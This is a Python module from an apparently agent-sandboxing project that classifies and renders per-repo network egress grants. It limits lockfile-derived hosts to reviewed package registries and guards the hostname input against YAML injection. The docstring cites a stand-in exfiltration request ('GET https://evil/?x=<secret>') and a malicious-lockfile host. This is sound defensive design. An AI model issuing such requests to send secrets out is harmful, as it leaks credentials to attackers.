"""Per-repo sandbox egress rendering (ADR 0009 §2a).

Deny-by-default egress is the right default for an unknown repo running a
``--yolo`` agent, but it must not be a fixed wall: a real repository
legitimately fetches from package registries, and that allowlist is part of the
repo's environment contract exactly as its version floors are.  ADR 0009 §2a
accepted the per-repo model; this module is the rendering half.  Until it
landed, ``deploy/openshell/mac-hermes-policy.yaml`` had to declare every repo's
hosts **fleet-wide** — every sandbox in the fleet carried the union of every
repo's egress, which is precisely the accumulation the ADR set out to stop.

Why this is not a straight wiring job
-------------------------------------
:func:`mac.environment_contract.derive_environment_contract` derives
``egress.hosts`` by reading ``.npmrc`` and lockfile resolution URLs **from the
repository working tree**.  That tree is attacker-controllable: anyone who can
open a pull request can add a lockfile entry resolving to a host they own.
Granting sandbox egress straight from those hosts would hand a malicious PR an
arbitrary-host exfiltration channel out of an agent running with its approval
gate disabled — a strictly worse posture than the fleet-wide wall it replaces.

So derivation is a *proposal*, never a grant.  Two trust tiers decide:

``derived_trusted_registry``
    Host was derived from the working tree AND matches :data:`TRUSTED_REGISTRY_HOSTS`,
    a small reviewed set of package registries.  A lockfile pointing at
    ``evil.example`` is not granted; it is reported as a contract gap.  This
    tier is what makes the common case ("this repo needs the npm registry")
    automatic without trusting repo content.

``hub_declared``
    Host came from control-plane state (task metadata written through an
    authenticated hub credential), not from repo content.  This is the tier for
    ADR 0009 §2a's declared integration APIs.  It is a real trust boundary but
    an honest one: it means "someone with a hub token asserted this", NOT
    "someone with commit access", and it is audited per grant.

Everything else is rejected with a reason.  Every grant is ``access:
read-only`` and host-scoped, per ADR 0009 §2a — host-allowlisting is the axis,
because ``GET https://evil/?x=<secret>`` is exfiltration with a GET.

YAML injection
--------------
Policy text is assembled by string concatenation (matching
``mac.openshell_policy._shared_service_blocks``), and derived hosts are
untrusted input, so :func:`normalize_host` is a hard gate rather than a tidy-up:
anything that is not a plain lowercase DNS hostname — globs, embedded ports,
userinfo, whitespace, newlines, YAML metacharacters — is rejected before it can
reach the renderer.  A rejected host is never emitted in any form.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Dict, Iterable, List, Optional, Sequence, Tuple

import yaml

SANDBOX_EGRESS_SCHEMA = "mac.sandbox_egress.v1"

#: Trust tier for a host derived from repo content that matched the reviewed
#: registry allowlist.
TIER_DERIVED_REGISTRY = "derived_trusted_registry"
#: Trust tier for a host supplied by control-plane state rather than repo content.
TIER_HUB_DECLARED = "hub_declared"

#: Reviewed package-registry hosts a repository may reach on the strength of its
#: own lockfiles alone.  Deliberately small: each entry is an assertion that the
#: host is a package registry operated by a known ecosystem, so that "this repo's
#: lockfile resolves from here" is sufficient evidence to allow a read-only
#: fetch.  Adding an entry is an attack-surface decision (ADR 0009 §1's rule for
#: the base image applies equally here) — it widens egress for EVERY repo whose
#: lockfile happens to name it, not just the repo that prompted the addition.
#:
#: Mirrors the registries already declared fleet-wide in
#: deploy/openshell/mac-hermes-policy.yaml (node_packages / python_packages), so
#: enabling expansion narrows the fleet default rather than widening it.
TRUSTED_REGISTRY_HOSTS: frozenset = frozenset(
    {
        # JavaScript / Node
        "registry.npmjs.org",
        "registry.yarnpkg.com",
        # node-gyp fetches the Node headers tarball for native builds. Already
        # fleet-wide in the template's node_packages block, read-only.
        "nodejs.org",
        # Python
        "pypi.org",
        "files.pythonhosted.org",
        # Rust
        "crates.io",
        "static.crates.io",
        # Go
        "proxy.golang.org",
        "sum.golang.org",
        # Ruby
        "rubygems.org",
        # JVM
        "repo.maven.apache.org",
        "repo1.maven.org",
    }
)

#: A plain DNS hostname: lowercase alphanumeric labels separated by dots, at
#: least two labels, 253 chars max, no leading/trailing hyphen in any label.
#: Intentionally rejects globs (``**.api5.cursor.sh`` is legitimate in a
#: hand-reviewed policy but must never be synthesized from untrusted input),
#: single-label names, IP literals, ports, and anything with YAML significance.
_HOSTNAME_RE = re.compile(
    r"^(?=.{1,253}$)"
    r"[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?"
    r"(?:\.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+$"
)

# Rejection reasons (stable strings — they land in audit records).
REJECT_MALFORMED = "malformed_hostname"
REJECT_UNTRUSTED_DERIVED = "derived_host_not_in_trusted_registry_allowlist"


@dataclass(frozen=True)
class EgressGrant:
    """One host the sandbox will be allowed to reach, and why."""

    host: str
    tier: str
    access: str = "read-only"

    def to_dict(self) -> Dict[str, str]:
        return {"host": self.host, "tier": self.tier, "access": self.access}


@dataclass(frozen=True)
class EgressRejection:
    """One proposed host that was NOT granted, and why."""

    host: str
    reason: str

    def to_dict(self) -> Dict[str, str]:
        return {"host": self.host, "reason": self.reason}


@dataclass(frozen=True)
class EgressDecision:
    """The full, auditable outcome of classifying one task's proposed egress."""

    granted: Tuple[EgressGrant, ...] = ()
    rejected: Tuple[EgressRejection, ...] = ()

    @property
    def granted_hosts(self) -> List[str]:
        return [grant.host for grant in self.granted]

    @property
    def is_empty(self) -> bool:
        return not self.granted

    def to_dict(self) -> Dict[str, object]:
        """Audit-shaped summary. Rejections are retained, not silently dropped:
        a repo whose legitimate dependency was denied and a repo probing for an
        exfiltration path look identical in a log that only records grants."""
        return {
            "schema": SANDBOX_EGRESS_SCHEMA,
            "granted": [grant.to_dict() for grant in self.granted],
            "rejected": [rejection.to_dict() for rejection in self.rejected],
            "granted_count": len(self.granted),
            "rejected_count": len(self.rejected),
        }


def normalize_host(value: object) -> Optional[str]:
    """Return ``value`` as a plain lowercase DNS hostname, or None if it is not one.

    This is the injection gate for untrusted input, so it is deliberately
    strict and total: any input that is not unambiguously a hostname returns
    None rather than being repaired.  A trailing dot (the DNS root) is accepted
    and stripped; everything else — schemes, ports, paths, credentials, globs,
    whitespace, YAML metacharacters, IP literals — is rejected.
    """
    if not isinstance(value, str):
        return None
    host = value.strip().rstrip(".").lower()
    if not host:
        return None
    if not _HOSTNAME_RE.match(host):
        return None
    # An all-numeric final label means an IPv4 literal (or a typo'd one).
    # Host-allowlisting an address bypasses the DNS-name identity the rest of
    # the policy reasons about, so refuse it.
    if host.rsplit(".", 1)[-1].isdigit():
        return None
    return host


def classify_egress_hosts(
    *,
    derived: Optional[Iterable[object]] = None,
    declared: Optional[Iterable[object]] = None,
    trusted_registries: Optional[Iterable[str]] = None,
) -> EgressDecision:
    """Decide which proposed egress hosts a task's sandbox may actually reach.

    ``derived``
        Hosts from :func:`mac.environment_contract.derive_environment_contract`
        — i.e. read out of the repository working tree.  UNTRUSTED: granted only
        on an exact match against ``trusted_registries``.
    ``declared``
        Hosts from control-plane state (see module docstring for exactly what
        that trust level means).  Granted when well-formed.

    A host proposed by both tiers is granted once, attributed to the stronger
    (``hub_declared``) tier, so the audit record does not imply the registry
    allowlist was what authorized it.
    """
    allowlist = (
        frozenset(trusted_registries)
        if trusted_registries is not None
        else TRUSTED_REGISTRY_HOSTS
    )
    grants: Dict[str, EgressGrant] = {}
    rejections: List[EgressRejection] = []
    seen_rejected: set = set()

    def reject(raw: object, reason: str) -> None:
        # Echo the raw value for operator diagnosis but bound it, so a
        # megabyte of lockfile garbage can't bloat the audit record.
        shown = str(raw)[:200]
        key = (shown, reason)
        if key in seen_rejected:
            return
        seen_rejected.add(key)
        rejections.append(EgressRejection(host=shown, reason=reason))

    # Declared first, so a host in both tiers is attributed to hub_declared.
    for raw in declared or ():
        host = normalize_host(raw)
        if host is None:
            reject(raw, REJECT_MALFORMED)
            continue
        grants.setdefault(host, EgressGrant(host=host, tier=TIER_HUB_DECLARED))

    for raw in derived or ():
        host = normalize_host(raw)
        if host is None:
            reject(raw, REJECT_MALFORMED)
            continue
        if host in grants:
            continue
        if host not in allowlist:
            reject(host, REJECT_UNTRUSTED_DERIVED)
            continue
        grants[host] = EgressGrant(host=host, tier=TIER_DERIVED_REGISTRY)

    return EgressDecision(
        granted=tuple(grants[host] for host in sorted(grants)),
        rejected=tuple(sorted(rejections, key=lambda item: (item.reason, item.host))),
    )


def render_egress_block(
    decision: EgressDecision,
    *,
    binaries: Sequence[str],
    block_name: str = "repo_declared_egress",
) -> str:
    """Render granted hosts as one ``network_policies`` YAML block.

    Shape and indentation match ``mac.openshell_policy._shared_service_blocks``
    so the result appends cleanly under the template's existing
    ``network_policies`` mapping.  Returns ``""`` when nothing was granted — an
    empty block would be a syntactically valid policy that silently widens
    nothing, but emitting it would make an all-rejected decision look like a
    successful expansion in a diff.
    """
    if decision.is_empty:
        return ""
    if not binaries:
        raise ValueError("egress block requires at least one binary path")
    safe_binaries = [str(path) for path in binaries if str(path).strip()]
    if not safe_binaries:
        raise ValueError("egress block requires at least one non-empty binary path")

    lines: List[str] = [
        "  # --- Per-repo egress derived from this task's environment contract.",
        "  # Rendered by mac.sandbox_egress (ADR 0009 §2a) — do not hand-edit.",
        "  %s:" % block_name,
        "    name: %s" % block_name.replace("_", "-"),
        "    endpoints:",
    ]
    for grant in decision.granted:
        lines += [
            "      # tier: %s" % grant.tier,
            "      - host: %s" % grant.host,
            "        port: 443",
            "        protocol: rest",
            "        enforcement: enforce",
            "        access: %s" % grant.access,
        ]
    lines.append("    binaries:")
    for path in safe_binaries:
        lines.append("      - { path: %s }" % path)
    return "\n".join(lines)


def expand_policy_text(
    base_policy_text: str,
    decision: EgressDecision,
    *,
    binaries: Sequence[str],
    block_name: str = "repo_declared_egress",
) -> str:
    """Append the rendered per-repo egress block to ``base_policy_text``.

    The base policy is never rewritten or reparsed — only appended to — so this
    can only ADD the reviewed hosts above and can never relax a filesystem
    rule, the Landlock posture, or the ``run_as_user`` identity that the base
    policy establishes.  With an empty decision the base text is returned byte
    for byte.
    """
    block = render_egress_block(
        decision, binaries=binaries, block_name=block_name
    )
    if not block:
        return base_policy_text

    # The block is appended as TEXT, so the base must already carry a
    # `network_policies:` BLOCK mapping with at least one entry for the new
    # entry to attach to. Two shapes must be refused rather than appended to:
    #
    #   * key absent      -> the block would land under nothing and the egress
    #                        would silently not be enforced.
    #   * `network_policies: {}` -> the bundled fail-closed default. Appending
    #     block entries under a flow mapping is a YAML parse error, and even if
    #     it parsed, widening the deny-all default would quietly turn
    #     "unconfigured deployment fails closed" into "unconfigured deployment
    #     has egress" — the opposite of what that default exists to guarantee.
    try:
        parsed = yaml.safe_load(base_policy_text) or {}
    except yaml.YAMLError as exc:
        raise ValueError("base policy is not valid YAML: %s" % exc) from exc
    existing = parsed.get("network_policies") if isinstance(parsed, dict) else None
    if not isinstance(existing, dict) or not existing:
        raise ValueError(
            "base policy declares no non-empty network_policies mapping "
            "(deny-all default or missing key); refusing to append a per-repo "
            "egress block that would not be enforced"
        )
    if block_name in existing:
        raise ValueError(
            "base policy already declares a %r network policy; refusing to "
            "emit a duplicate key" % block_name
        )
    return base_policy_text.rstrip("\n") + "\n" + block + "\n"
